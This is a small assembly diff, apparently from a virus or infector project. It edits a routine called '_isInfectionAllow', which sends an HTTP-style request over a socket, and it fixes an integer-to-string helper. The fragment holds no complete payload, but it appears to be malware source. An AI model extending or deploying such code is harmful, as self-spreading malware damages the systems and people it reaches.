@@ -725,6 +725,7 @@ _isInfectionAllow:
         ;rdi == sockfd
         mov rdi, rax
         mov rax, SYS_SENDTO
+		push rax
 		push rdi
 		lea rdi, [rel headerGet]
 		mov rsi, headerGetLen
@@ -858,7 +859,7 @@ _itoa:
     _itoaLoop:
         cmp rax, 9
         jg _itoaRecursif
-        mov [rsi], ax
+        mov [rsi], byte rax
         add byte [rsi], 48
         inc rsi
         ret
